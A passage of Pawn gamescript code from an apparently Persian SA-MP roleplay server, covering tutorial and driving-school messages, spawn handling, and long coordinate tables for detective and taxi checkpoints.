                    SendClientMessage(i, COLOR_TUT96, "Level 5+(Families): Member The Killers, Dangerous Tigers, Storm Men, Silence Mafia, The Racers, Legendary Men or Fast N Furious.");
                    SendClientMessage(i, COLOR_TUT96, "Level 10: Police Departament, FBI, National Guard, SFPD or Hitman Agency. ");
                    SendClientMessage(i, COLOR_TUT96, "Secondary Job's: Detective, Lawyer, Car Mechanic, Drugs Dealer, Arms Dealer, Bus Drive , Trucker , Farmer, Garbageman");
                }
                else if(TutTime1[i] == 80)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Level{FFFF00}_____|");
                }
                else if(TutTime1[i] == 83)
                {
                    SendClientMessage(i, COLOR_TUT96, "As a RolePlay server, you can increase your level by staying online.");
                    SendClientMessage(i, COLOR_TUT96, "To level up need a certain number or Respect Points.");
                    SendClientMessage(i, COLOR_TUT96, "You earn a Respect Point every PayDay (it comes after 60 minutes).");
                    SendClientMessage(i, COLOR_TUT96, "To see how many points you need, you have to write /stats and look at the 'Respect: x/x'.");
                    SendClientMessage(i, COLOR_TUT96, "When you reach the required number of points then you should write /buylevel to do level up (it will cost a some of money). ");
                }
                else if(TutTime1[i] == 101)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Cheats{FFFF00}_____|");
                }
                else if(TutTime1[i] == 104)
                {
                    SendClientMessage(i, COLOR_TUT96, "It is a forbbiden to use hackings applications.");
                    SendClientMessage(i, COLOR_TUT96, "If you see someone who uses hacks, notify us by using /report.");
                    SendClientMessage(i, COLOR_TUT96, "Those who are using hacks will be banned permanently.");
                    SendClientMessage(i, COLOR_TUT96, "Do not forget! Anti-Cheat system works and you will receive permanent ban if you get caught.");
                }
                else if(TutTime1[i] == 116)
                {
                    SetPlayerInterior(i, 0);
                    SetPlayerPosEx(i, 1611.612548,-2177.123779,13.554687);
                    SetPlayerFacingAngle(i, 3.41);
                    SetPlayerCameraPos(i, 1847.3835, -1279.1182, 162.2873);
                    SetPlayerCameraLookAt(i, 1847.2848, -1280.1263, 161.7025);
                    SetPlayerVirtualWorld(i, (i + 1));
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}Language{FFFF00}_____|");
                }
                else if(TutTime1[i] == 119)
                {
                    SendClientMessage(i, COLOR_TUT96, "Every player must speak in Persian or English.");
                    SendClientMessage(i, COLOR_TUT96, "If you want talk other language then use /b.");
                    SendClientMessage(i, COLOR_TUT96, "Do not used capital letters and please write correctly.");
                    SendClientMessage(i, COLOR_TUT96, "Also, you are not allowed to use nasty words.");
                    SendClientMessage(i, COLOR_TUT96, "Advertisments of other servers will get you to permanent ban.");
                }
                else if(TutTime1[i] == 131)
                {
                    SendClientMessage(i, COLOR_Jooje, "|_____Tutorial: {FFFFFF}The End{FFFF00}_____|");
                }
                else if(TutTime1[i] == 134)
                {
                    SendClientMessage(i, COLOR_TUT96, "I hope you understand what is RolePlay about.");
                    SendClientMessage(i, COLOR_TUT96, "We still want to remember you that you have to read our rules(/rules).");
                    SendClientMessage(i, COLOR_TUT96, "VirtualLifeiran wishes you have fun!");
                    PlayerInfo[i][pTut] = 1;
                    SaveKonVal(i, "pTut", 1);
                }
                else if(TutTime1[i] == 141)
                {
				*/
                MedicBill[i] = 0;
                SCM(i, COLOR_WHITE, " ");
                TutTime1[i] = 0;
                TogglePlayerSpectating(i, 0);
                ResetPlayerTofang(i);
                SetSpawnKol(i);
                SpawnPlayer(i);
                    SetPlayerSpawn(i);
                    SetPlayerVirtualWorld(i, 0);
                    SetCameraBehindPlayer(i);
                    TogglePlayerControllable(i, 1);
                    SetPlayerKhoon(true, i,100);
                    PlayerInfo[i][pLevel] = 1;
                    SaveKonVal(i, "pLevel", 1);
                    //SaveAccount(i);
                    SetPlayerVirtualWorld(i, 0);
                gOoc[i] = 0; gNews[i] = 0; gFam[i] = 0;
                HealthAllowedForPlayer[i] = 1;
                AntiKhoonHack[i] = SetTimerEx("KhoonTimer",2000,1,"i",i);
               // }
            }
           /*if(DMVPrepare[i] >= 1)
            {
                DMVPrepare[i] += 1;
                if(DMVPrepare[i] == 2)
                {
if(PlayerInfo[i][pLanguage] == 2)
{
new ali = random(sizeof(gSpawn));
TogglePlayerControllable(i, 0);
SetPlayerPosEx(i,gSpawn[ali][0],gSpawn[ali][1],gSpawn[ali][2]);
endchair(i);
SetPlayerFacingAngle( i, 90 );
SetCameraBehindPlayer(i);
                    SendClientMessage(i,COLOR_YELLOW,"|______ {FFFFFF}DMV {FFFF00}_____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Welcome To DMV.");
                    SendClientMessage(i,COLOR_WHITE,"Please listen to The Instructor.");
                }
else if(PlayerInfo[i][pLanguage] == 1)
{
new ali = random(sizeof(gSpawn));
TogglePlayerControllable(i, 0);
SetPlayerPosEx(i,gSpawn[ali][0],gSpawn[ali][1],gSpawn[ali][2]);
endchair(i);
SetPlayerFacingAngle( i, 90 );
SetCameraBehindPlayer(i);
SendClientMessage(i,COLOR_YELLOW,"|______ {FFFFFF}amoozeshgah {FFFF00}_____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Khosh amadid be DMV.");
                    SendClientMessage(i,COLOR_WHITE,"Lotfan be harf haye Moalem goosh dahid.");
}
}
                else if(DMVPrepare[i] == 6)
                {
if(PlayerInfo[i][pLanguage] == 2)
{
                    SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Instructor _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"You must driving at Right Street.");
                    SendClientMessage(i,COLOR_WHITE,"When right street was Blocked You can Drive at Left street.");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"You can cross the road without lights because they are too long.");
                    SendClientMessage(i,COLOR_WHITE,"You can not drive fast in the streets and other places, you may be fined or your license will be confiscated.");
                       SendClientMessage(i,COLOR_LIGHTBLUE,"If any Player damage your car Use /call 110");
                }
else if(PlayerInfo[i][pLanguage] == 1)
{
SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Moalem _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Salam, omid varam ke haletoon khoob bashad, khob Shoma bayad hamishe dar khiabane samte rast ranandegi konid.");
                    SendClientMessage(i,COLOR_WHITE,"Vaghti khiabane samte rast baste bood shoma mitavanid dar samte chap harekat konid.");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Shoma mitoonid az cheragh ghermez ha rad beshid, zira cheragh ha kheili toolani hastan.");
                    SendClientMessage(i,COLOR_WHITE,"Shoma nemitavanid sari ranandegi konid, vagarna govahiname shoma tavasote police gerefte mishavad.");
                       SendClientMessage(i,COLOR_LIGHTBLUE,"Agar kasi mashine shomara daghoon kard be police zang bezanid.(/call 110)");
}
}
                else if(DMVPrepare[i] == 23)
                {
if(PlayerInfo[i][pLanguage] == 2)
{
                    SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Instructor _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"When a cop tells you to stop your car, you must stop your car and leave your car.");
                    SendClientMessage(i,COLOR_WHITE,"You have to respect cops and authorization them to go first at streets and ways.");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"You can use nitro, but just when you had a permission of cops and at normal times you not allowed to use this.");
                    SendClientMessage(i,COLOR_WHITE,"Remember, you can get arrested and your license is blocked for illegal racing.");
                }
else if(PlayerInfo[i][pLanguage] == 1)
{
SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Moalem _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Agar police be shoma goft ke beistid shoma bayad tavaqof konid va mashine khod ra tark konid va be samte police beravid.");
                    SendClientMessage(i,COLOR_WHITE,"Shoma bayad be police ehteran bezarid va be oo haghe taghadom dahid.");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Shoma ejaze nadarid ke az nitro estefade konid, be estesna ba hamahngi police.");
                    SendClientMessage(i,COLOR_WHITE,"Agar shoma be mosabeghate gheire ghanooni beravid, shoma dastgir mishavid.");
}
}
                else if(DMVPrepare[i] == 36)
                {
if(PlayerInfo[i][pLanguage] == 2)
{
                     SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Instructor _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"If someone stole your car use /call 911.");
                    SendClientMessage(i,COLOR_WHITE,"If you have an accident, use /service medic.");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"You can not stop in the street.");
                }
else if(PlayerInfo[i][pLanguage] == 1)
{
SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Moalem _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Agar mashine shomara dozdidand ba police tamas begirid.(/call 911)");
                    SendClientMessage(i,COLOR_WHITE,"Agar shoma tasadof kardid ya dochare havadesi shodid ba pezeshk dar tamas bashid.(/service medic)");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Shoma nemitavanid dar khiaban tavaqof konid.");
}
}
                else if(DMVPrepare[i] == 46)
                {
if(PlayerInfo[i][pLanguage] == 2)
{
                    SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Instructor _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Speeds:Allowed speed In city is 100km/h in Out of city is 160km/h.");
                    SendClientMessage(i,COLOR_WHITE,"Be cerfule when you Broke your Speed Cops can ticket you or take your license.");
                    SCM(i,COLOR_LIGHTBLUE,"Use /speedlimit <Max speed> to enable your speed limit.");
                    DMVPrepare[i] = 0;
            TogglePlayerControllable(i, 1);
            DMVT[i] = 0;
                }
else if(PlayerInfo[i][pLanguage] == 1)
{
 SendClientMessage(i,COLOR_LIGHTGREEN,"|______ Moalem _____| ");
                    SendClientMessage(i,COLOR_LIGHTBLUE,"Sorat: shoma mitavanid dar shahr 100km/h beravid va khareje shahr 160km/h berabid.");
                    SendClientMessage(i,COLOR_WHITE,"Movazeb bashid, agar shoma be nokate ranandegi tavajoh nakonid va sorat gheire mojaz raftid police govahiname shomara migirad.");
                    SCM(i,COLOR_LIGHTBLUE,"Shoma mitoonid az /speedlimit <Max speed> estefade konid baraye mahdood kardane sorate khodetoon dar vasile naghlie khodetoon.");
            DMVPrepare[i] = 0;
            TogglePlayerControllable(i, 1);
            DMVT[i] = 0;

}

            }
}*/
            if(PlayerTazeTime[i] >= 1)
            {
                PlayerTazeTime[i] += 1;
                if(PlayerTazeTime[i] == 15)
                {
                    PlayerTazeTime[i] = 0;
                }
                else
                {
return 1;
                }
            }
            if(PlayerInfo[i][pCarTime] > 0)
            {
                if(PlayerInfo[i][pCarTime] <= 0)
                {
                    PlayerInfo[i][pCarTime] = 0;
                }
                else
                {
                    PlayerInfo[i][pCarTime] -= 1;
                }
            }
//-------------------------------------------------------
    if(FindTime[i] > 0)
        {
		if(!IsPlayerConnected(FindAccepted[i]))
        {
        FindTime[i] = 0; FindTimePoints[i] = 0; DisablePlayerCheckpoint(i); OnCheckpoint[i] = 0; PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1); SCM(i,COL_SYN,"Target left the server.");
        }
		if(IsPlayerConnected(FindAccepted[i]))
        {
        OnCheckpoint[i] = 1;
		if(Mahal[FindAccepted[i]] == 1)
        {
        SetPlayerCheckpoint(i,1310.126586,-1367.812255,13.540800,5);
        }
        if(Mahal[FindAccepted[i]] == 2)
        {
        SetPlayerCheckpoint(i,1797.442504,-1578.950683,14.085444,5);
        }
        if(Mahal[FindAccepted[i]] == 3 && TooHouse[FindAccepted[i]] != 9999)
        {
        new house = TooHouse[FindAccepted[i]];
        SetPlayerCheckpoint(i,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz],5);
        }

        if(Mahal[FindAccepted[i]] == 4)
        {
        SetPlayerCheckpoint(i,1481.0289,-1770.9703,18.7958,5);
        }
        if(Mahal[FindAccepted[i]] == 5)
        {
        SetPlayerCheckpoint(i,1554.9100,-1675.6428,16.1953,5);
        }
        if(Mahal[FindAccepted[i]] == 6)
        {
        SetPlayerCheckpoint(i,2287.0576,2432.1121,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 7)
        {
        SetPlayerCheckpoint(i,725.5550,-1451.0232,17.6953,5);
        }
        if(Mahal[FindAccepted[i]] == 8)
        {
        SetPlayerCheckpoint(i,1455.4546,750.9794,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 9)
        {
        SetPlayerCheckpoint(i,1456.7424,2773.4614,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 10)
        {
        SetPlayerCheckpoint(i,1080.997192,-345.408233,73.984069,5);
        }
        if(Mahal[FindAccepted[i]] == 11)
        {
        SetPlayerCheckpoint(i,2792.930175,-1087.530761,30.718750,5);
        }
        if(Mahal[FindAccepted[i]] == 12)
        {
        SetPlayerCheckpoint(i,2637.1936,2352.0090,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 13)
        {
        SetPlayerCheckpoint(i,1122.7065,-2037.0063,69.8942,5);
        }
        if(Mahal[FindAccepted[i]] == 14)
        {
        SetPlayerCheckpoint(i,937.3935,1733.2067,8.8516,5);
        }
        if(Mahal[FindAccepted[i]] == 15 && TooBiz[FindAccepted[i]] != 9999)
        {
        new bizw = TooBiz[FindAccepted[i]];
        SetPlayerCheckpoint(i,BizzInfo[bizw][bEntranceX],BizzInfo[bizw][bEntranceY],BizzInfo[bizw][bEntranceZ],5);
        }
        if(Mahal[FindAccepted[i]] == 16)
        {
        SetPlayerCheckpoint(i,2421.4998,-1219.2438,25.56175,5);
        }
        if(Mahal[FindAccepted[i]] == 17)
        {
        SetPlayerCheckpoint(i,2229.9011,-1721.2582,13.5613,5);
        }
        if(Mahal[FindAccepted[i]] == 18)
        {
        SetPlayerCheckpoint(i,2577.4768,1325.4229,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 19)
        {
        SetPlayerCheckpoint(i,1461.695, -1011.915, 26.84375,5);
        }
        if(Mahal[FindAccepted[i]] == 20)
        {
        SetPlayerCheckpoint(i,2436.9211,1734.6388,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 21)
        {
        SetPlayerCheckpoint(i,1599.1802,2221.7549,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 22)
        {
        SetPlayerCheckpoint(i,2188.0947,2469.6829,11.2422,5);
        }
        if(Mahal[FindAccepted[i]] == 23)
        {
        SetPlayerCheckpoint(i,2097.4456,2224.2317,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 24)
        {
        SetPlayerCheckpoint(i,2637.1113,1129.2675,11.1797,5);
        }
        if(Mahal[FindAccepted[i]] == 25)
        {
        SetPlayerCheckpoint(i,1550.5363,1120.4553,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 26)
        {
        SetPlayerCheckpoint(i,2150.7559,2733.8718,11.1763,5);
        }
        if(Mahal[FindAccepted[i]] == 27)
        {
        SetPlayerCheckpoint(i,-19.2424,1175.5189,19.5634,5);
        }
        if(Mahal[FindAccepted[i]] == 28)
        {
        SetPlayerCheckpoint(i,2193.7659,1991.2770,12.2969,5);
        }
        if(Mahal[FindAccepted[i]] == 29)
        {
        SetPlayerCheckpoint(i,2441.1169,2065.3987,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 30)
        {
        SetPlayerCheckpoint(i,2308.5569,-1643.9500,14.8270,5);
        }
        if(Mahal[FindAccepted[i]] == 31)
        {
        SetPlayerCheckpoint(i,2441.1716,2163.5334,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 32)
        {
        SetPlayerCheckpoint(i,1352.4738,-1758.7869,13.5078,5);
        }
        if(Mahal[FindAccepted[i]] == 33)
        {
        SetPlayerCheckpoint(i,1833.4373,-1842.5286,13.5781,5);
        }
        if(Mahal[FindAccepted[i]] == 34)
        {
        SetPlayerCheckpoint(i,1315.5024,-897.8165,39.5781,5);
        }
        if(Mahal[FindAccepted[i]] == 35)
        {
        SetPlayerCheckpoint(i,1000.1695,-919.9931,42.3281,5);
        }
        if(Mahal[FindAccepted[i]] == 36)
        {
        SetPlayerCheckpoint(i,-78.5365,-1169.9178,2.1389,5);
        }
        if(Mahal[FindAccepted[i]] == 37)
        {
        SetPlayerCheckpoint(i,762.7137,-1792.9973,13.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 38)
        {
        SetPlayerCheckpoint(i,2165.875732,-1671.250000,15.073156,5);
        }
        if(Mahal[FindAccepted[i]] == 39)
        {
        SetPlayerCheckpoint(i,1199.3704,-918.4752,43.1199,5);
        }
        if(Mahal[FindAccepted[i]] == 40)
        {
        SetPlayerCheckpoint(i,2169.4907,2795.8733,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 41)
        {
        SetPlayerCheckpoint(i,928.3752,-1352.9083,13.3438,5);
        }
        if(Mahal[FindAccepted[i]] == 42)
        {
        SetPlayerCheckpoint(i,810.8053,-1616.1349,13.5469,5);
        }
        if(Mahal[FindAccepted[i]] == 43)
        {
        SetPlayerCheckpoint(i,2472.7500,2034.2101,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 44)
        {
        SetPlayerCheckpoint(i,2083.2698,2224.6626,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 45)
        {
        SetPlayerCheckpoint(i,1872.4313,2071.8857,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 46)
        {
        SetPlayerCheckpoint(i,2393.2512,2041.7485,10.8203,5);
        }
        if(Mahal[FindAccepted[i]] == 47)
        {
        SetPlayerCheckpoint(i,2102.1255,2228.7788,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 48)
        {
        SetPlayerCheckpoint(i,2105.1135,-1806.5432,13.5547,5);
        }
        if(Mahal[FindAccepted[i]] == 49)
        {
        SetPlayerCheckpoint(i,1656.7053,1733.3455,10.8281,5);
        }
        if(Mahal[FindAccepted[i]] == 50)
        {
        SetPlayerCheckpoint(i,2102.1282,2257.4785,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 51)
        {
        SetPlayerCheckpoint(i,2244.2517,-1665.4854,15.4766,5);
        }
        if(Mahal[FindAccepted[i]] == 52)
        {
        SetPlayerCheckpoint(i,2090.4385,2224.5938,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 53)
        {
        SetPlayerCheckpoint(i,2638.0071,1671.8262,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 54)
        {
        SetPlayerCheckpoint(i,2638.3850,1849.7784,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 55)
        {
        SetPlayerCheckpoint(i,2572.0415,1904.6978,11.0234,5);
        }
        if(Mahal[FindAccepted[i]] == 56)
        {
        SetPlayerCheckpoint(i,2420.1963,-1509.0098,24.0000,5);
        }
        if(Mahal[FindAccepted[i]] == 57)
        {
        SetPlayerCheckpoint(i,1158.0591,2072.2092,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 58)
        {
        SetPlayerCheckpoint(i,2884.5710,2454.0039,11.0690,5);
        }
        if(Mahal[FindAccepted[i]] == 59)
        {
        SetPlayerCheckpoint(i,2845.8950,2415.3938,11.0690,5);
        }
        if(Mahal[FindAccepted[i]] == 60)
        {
        SetPlayerCheckpoint(i,2756.7285,2477.2551,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 61)
        {
        SetPlayerCheckpoint(i,2802.8596,2430.6089,11.0625,5);
        }
        if(Mahal[FindAccepted[i]] == 70)
        {
        SetPlayerCheckpoint(i,1607.520996,1815.756591,10.820312,5);
        }
        if(Mahal[FindAccepted[i]] == 71)
        {
        SetPlayerCheckpoint(i,-329.770111,1536.920532,76.611709,5);
        }
        if(Mahal[FindAccepted[i]] == 199) SetPlayerCheckpoint(i,225.776153,1023.474426,1084.011840,5);
        new Float:X,Float:Y,Float:Z;
        GetPlayerPos(FindAccepted[i], X, Y, Z);
        if(Mahal[FindAccepted[i]] == 9999)
        {
        SetPlayerCheckpoint(i, X, Y, Z, 5);
        }
        if(PlayerInfo[i][pDetSkill] <= 399)
        {
                if(FindTime[i] == FindTimePoints[i])
                {
                 FindTime[i] = 0; FindTimePoints[i] = 0; DisablePlayerCheckpoint(i);OnCheckpoint[i] = 0; PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1);
                }
                else
                {
                    format(string, sizeof(string), "%d", FindTimePoints[i] - FindTime[i]);
                    GameTextForPlayer(i, string, 1500, 6);
                    FindTime[i] += 1;
                }
            }
            }
            }
        if(UseAtm[i] == 1)
        {
        if(AtmTime[i] == 7)
                {
                 AtmTime[i] = 0; UseAtm[i] = 0; StopLoopingAnim(i); TogglePlayerControllable(i, 1);
                }
                else
                {

                    AtmTime[i] += 1;
                }
                }
            if(TaxiCallTime[i] > 0)
            {
                if(IAcceptTaxi[i] == 1)
                {
            if(!IsPlayerConnected(TaxiAccepted[i]))
            {
            TaxiCallTime[i] = 0; TaxiAccepted[i] = INVALID_PLAYER_ID; IAcceptTaxi[i] = 0; DisablePlayerCheckpoint(i); OnCheckpoint[i] = 0; SCM(i,COL_SYN,"Target left the server.");
            }
                    if(IsPlayerConnected(TaxiAccepted[i]))
                    {
                    OnCheckpoint[i] = 1;
            if(Mahal[TaxiAccepted[i]] == 1)
            {
            SetPlayerCheckpoint(i,1310.126586,-1367.812255,13.540800,5);
            }
            if(Mahal[TaxiAccepted[i]] == 2)
            {
            SetPlayerCheckpoint(i,1797.442504,-1578.950683,14.085444,5);
            }
            if(Mahal[TaxiAccepted[i]] == 3 && TooHouse[TaxiAccepted[i]] != 9999)
            {
            new house = TooHouse[TaxiAccepted[i]];
            SetPlayerCheckpoint(i,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz],5);
            }
            if(Mahal[TaxiAccepted[i]] == 4)
            {
            SetPlayerCheckpoint(i,1481.0289,-1770.9703,18.7958,5);
            }
            if(Mahal[TaxiAccepted[i]] == 5)
            {
            SetPlayerCheckpoint(i,1554.9100,-1675.6428,16.1953,5);
            }
            if(Mahal[TaxiAccepted[i]] == 6)
            {
            SetPlayerCheckpoint(i,2287.0576,2432.1121,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 7)
            {
            SetPlayerCheckpoint(i,725.5550,-1451.0232,17.6953,5);
            }
            if(Mahal[TaxiAccepted[i]] == 8)
            {
            SetPlayerCheckpoint(i,1455.4546,750.9794,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 9)
            {
            SetPlayerCheckpoint(i,1456.7424,2773.4614,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 10)
            {
            SetPlayerCheckpoint(i,1080.997192,-345.408233,73.984069,5);
            }
            if(Mahal[TaxiAccepted[i]] == 11)
            {
            SetPlayerCheckpoint(i,2792.930175,-1087.530761,30.718750,5);
            }
            if(Mahal[TaxiAccepted[i]] == 12)
            {
            SetPlayerCheckpoint(i,2637.1936,2352.0090,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 13)
            {
            SetPlayerCheckpoint(i,1122.7065,-2037.0063,69.8942,5);
            }
            if(Mahal[TaxiAccepted[i]] == 14)
            {
            SetPlayerCheckpoint(i,937.3935,1733.2067,8.8516,5);
            }
            if(Mahal[TaxiAccepted[i]] == 15 && TooBiz[TaxiAccepted[i]] != 9999)
            {
            new bizw = TooBiz[TaxiAccepted[i]];
            SetPlayerCheckpoint(i,BizzInfo[bizw][bEntranceX],BizzInfo[bizw][bEntranceY],BizzInfo[bizw][bEntranceZ],5);
            }
            if(Mahal[TaxiAccepted[i]] == 16)
            {
            SetPlayerCheckpoint(i,2421.4998,-1219.2438,25.56175,5);
            }
            if(Mahal[TaxiAccepted[i]] == 17)
            {
            SetPlayerCheckpoint(i,2229.9011,-1721.2582,13.5613,5);
            }
            if(Mahal[TaxiAccepted[i]] == 18)
            {
            SetPlayerCheckpoint(i,2577.4768,1325.4229,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 19)
            {
            SetPlayerCheckpoint(i,1461.695, -1011.915, 26.84375,5);
            }
            if(Mahal[TaxiAccepted[i]] == 20)
            {
            SetPlayerCheckpoint(i,2436.9211,1734.6388,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 21)
            {
            SetPlayerCheckpoint(i,1599.1802,2221.7549,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 22)
            {
            SetPlayerCheckpoint(i,2188.0947,2469.6829,11.2422,5);
            }
            if(Mahal[TaxiAccepted[i]] == 23)
            {
            SetPlayerCheckpoint(i,2097.4456,2224.2317,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 24)
            {
            SetPlayerCheckpoint(i,2637.1113,1129.2675,11.1797,5);
            }
            if(Mahal[TaxiAccepted[i]] == 25)
            {
            SetPlayerCheckpoint(i,1550.5363,1120.4553,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 26)
            {
            SetPlayerCheckpoint(i,2150.7559,2733.8718,11.1763,5);
            }
            if(Mahal[TaxiAccepted[i]] == 27)
            {
            SetPlayerCheckpoint(i,-19.2424,1175.5189,19.5634,5);
            }
            if(Mahal[TaxiAccepted[i]] == 28)
            {
            SetPlayerCheckpoint(i,2193.7659,1991.2770,12.2969,5);
            }
            if(Mahal[TaxiAccepted[i]] == 29)
            {
            SetPlayerCheckpoint(i,2441.1169,2065.3987,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 30)
            {
            SetPlayerCheckpoint(i,2308.5569,-1643.9500,14.8270,5);
            }
            if(Mahal[TaxiAccepted[i]] == 31)
            {
            SetPlayerCheckpoint(i,2441.1716,2163.5334,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 32)
            {
            SetPlayerCheckpoint(i,1352.4738,-1758.7869,13.5078,5);
            }
            if(Mahal[TaxiAccepted[i]] == 33)
            {
            SetPlayerCheckpoint(i,1833.4373,-1842.5286,13.5781,5);
            }
            if(Mahal[TaxiAccepted[i]] == 34)
            {
            SetPlayerCheckpoint(i,1315.5024,-897.8165,39.5781,5);
            }
            if(Mahal[TaxiAccepted[i]] == 35)
            {
            SetPlayerCheckpoint(i,1000.1695,-919.9931,42.3281,5);
            }
            if(Mahal[TaxiAccepted[i]] == 36)
            {
            SetPlayerCheckpoint(i,-78.5365,-1169.9178,2.1389,5);
            }
            if(Mahal[TaxiAccepted[i]] == 37)
            {
            SetPlayerCheckpoint(i,762.7137,-1792.9973,13.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 38)
            {
            SetPlayerCheckpoint(i,2165.875732,-1671.250000,15.073156,5);
            }
            if(Mahal[TaxiAccepted[i]] == 39)
            {
            SetPlayerCheckpoint(i,1199.3704,-918.4752,43.1199,5);
            }
            if(Mahal[TaxiAccepted[i]] == 40)
            {
            SetPlayerCheckpoint(i,2169.4907,2795.8733,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 41)
            {
            SetPlayerCheckpoint(i,928.3752,-1352.9083,13.3438,5);
            }
            if(Mahal[TaxiAccepted[i]] == 42)
            {
            SetPlayerCheckpoint(i,810.8053,-1616.1349,13.5469,5);
            }
            if(Mahal[TaxiAccepted[i]] == 43)
            {
            SetPlayerCheckpoint(i,2472.7500,2034.2101,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 44)
            {
            SetPlayerCheckpoint(i,2083.2698,2224.6626,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 45)
            {
            SetPlayerCheckpoint(i,1872.4313,2071.8857,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 46)
            {
            SetPlayerCheckpoint(i,2393.2512,2041.7485,10.8203,5);
            }
            if(Mahal[TaxiAccepted[i]] == 47)
            {
            SetPlayerCheckpoint(i,2102.1255,2228.7788,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 48)
            {
            SetPlayerCheckpoint(i,2105.1135,-1806.5432,13.5547,5);
            }
            if(Mahal[TaxiAccepted[i]] == 49)
            {
            SetPlayerCheckpoint(i,1656.7053,1733.3455,10.8281,5);
            }
            if(Mahal[TaxiAccepted[i]] == 50)
            {
            SetPlayerCheckpoint(i,2102.1282,2257.4785,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 51)
            {
            SetPlayerCheckpoint(i,2244.2517,-1665.4854,15.4766,5);
            }
            if(Mahal[TaxiAccepted[i]] == 52)
            {
            SetPlayerCheckpoint(i,2090.4385,2224.5938,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 53)
            {
            SetPlayerCheckpoint(i,2638.0071,1671.8262,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 54)
            {
            SetPlayerCheckpoint(i,2638.3850,1849.7784,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 55)
            {
            SetPlayerCheckpoint(i,2572.0415,1904.6978,11.0234,5);
            }
            if(Mahal[TaxiAccepted[i]] == 56)
            {
            SetPlayerCheckpoint(i,2420.1963,-1509.0098,24.0000,5);
            }
            if(Mahal[TaxiAccepted[i]] == 57)
            {
